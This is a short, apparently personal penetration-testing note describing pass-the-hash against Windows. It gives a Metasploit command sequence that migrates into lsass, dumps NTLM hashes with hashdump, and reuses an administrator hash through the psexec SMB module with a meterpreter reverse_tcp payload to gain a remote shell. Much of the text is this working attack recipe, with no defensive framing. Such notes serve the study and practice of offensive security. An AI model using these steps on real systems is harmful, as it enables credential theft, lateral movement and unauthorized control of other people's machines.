We will want to move onto this technique after dumping hashes with mimikatz and we can now use these to authenticate legit with the target system.

Pass the has is an exploit technique that involves capturing or harvesting NTLM hashes or clear text passwords and utilizing them to auth with the target legit.
We can use the PsExec module to legit auth with the target system via SMB.
This technique will allow us to obtain access to the target system via legit creds as opposed to obtaining access via service exploitation.

pgrep lsass
migrate <ID>
getuid
hashdump (if you cant hashdump right away you may need to find another way to obtain the hashes)
**copy all hashes and paste to a file**
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp (change to the correct architecture)
you can specify hashes in the pass field and also specify domain if applicable
**copy the hash inbetween the colons**
set SMBUser Administrator <or the username you got from hashdump>
set SMBPass <hash>
exploit
